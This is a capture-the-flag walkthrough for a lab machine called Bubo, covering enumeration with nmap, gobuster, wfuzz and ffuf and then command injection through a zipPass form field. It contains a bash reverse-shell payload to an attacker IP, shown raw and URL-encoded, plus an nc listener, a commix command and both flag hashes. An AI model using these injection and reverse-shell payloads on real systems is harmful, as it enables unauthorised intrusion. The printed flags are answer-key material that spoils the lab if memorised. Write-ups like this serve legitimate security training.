# **BUBO**

---
## **LOCAL.TXT**

## **Run Nmap to see running services**
```
sudo nmap -O -Pn 192.168.206.121
```
![bubo_nmap](images/bubo_nmap.png) 

## **Run Gobuster for directory/file enumeration**
```
gobuster dir -u 192.168.206.121 -w /usr/share/wordlists/dirb/common.txt
```
![bubo_gobuster](images/bubo_gobuster.png) 

No interesting endpoint found.

## **Explore the links mentioned in Home page**

![bubo_webpage_home](images/bubo_webpage_home.png) 


![bubo_txt_file_content](images/bubo_txt_file_content.png) 

- Fuzz other possible txt files present.

```
wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404 http://192.168.206.121/scientific/repository/data/FUZZ.txt
```
![bubo_find_all_txt_files](images/bubo_find_all_txt_files.png) 

But no extra txt files found, those are same files mentioned in the home page.

## **Try to fuzz other file extensions**

- Try for pdf extension.
```
wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404 http://192.168.206.121/scientific/repository/data/FUZZ.pdf
```

OR

```
ffuf -w /usr/share/seclists/Fuzzing/5-digits-00000-99999.txt -u http://192.168.206.121/scientific/repository/data/FUZZ -e .txt,.pdf,.md -mc 200,301,302 -t 50
```

![bubo_fuzz_pdf_files](images/bubo_fuzz_pdf_files.png) 

OR 

![bubo_ffuf_file_extensions](images/bubo_ffuf_file_extensions.png) 


- Found two PDF files.

![bubo_found_pdf_file](images/bubo_found_pdf_file.png) 

- In the PDF file, a link was mentioned, try to access it. Then you can find the local.txt flag here.

![bubo_local_txt_flag](images/bubo_local_txt_flag.png) 

### local.txt flag:  404e2ac8debbb56670d27319b73d46bc

---

## **PROOF.TXT**

## **Intercept the Data submission POST request**

![bubo_data_submission_page](images/bubo_data_submission_page.png) 

- Try command injection for zipPass parameter, creata a reverse shell from https://www.revshells.com.

Payload:
```
zipPass=123|bash -c 'bash -i >& /dev/tcp/192.168.45.191/8090 0>&1'
```

![bubo_command_injection_payload](images/bubo_command_injection_payload.png) 

- Url encode the payload.

Payload:
```
zipPass=123|bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.191/8090+0>%261'
```

![bubo_reverse_shell_url_encode_burp](images/bubo_reverse_shell_url_encode_burp.png) 

![bubo_command_injection_payload_url_encoded](images/bubo_command_injection_payload_url_encoded.png) 

- To obtain a revershell, set up a Netcat listener on our kali linux machine on port 8090 
```
nc -nlvp 8090
```

- Now you can get the reverse shell. There is a proof.txt file is present. Now read that flag.   

![bubo_proof.txt_flag](images/bubo_proof.txt_flag.png)
   
### proof.txt flag: e4ae3b5de24d66fdfc0c908449743615

---

NOTE: Tool to detect Command Injectiom - [Commix](https://github.com/commixproject/commix ), but it did not work.

```
commix -u "http://192.168.206.121/personnelSubmission/index.php" --data="submissionData=Hi&passCheck=on&zipPass=INJECT_HERE" --level=3 --batch
```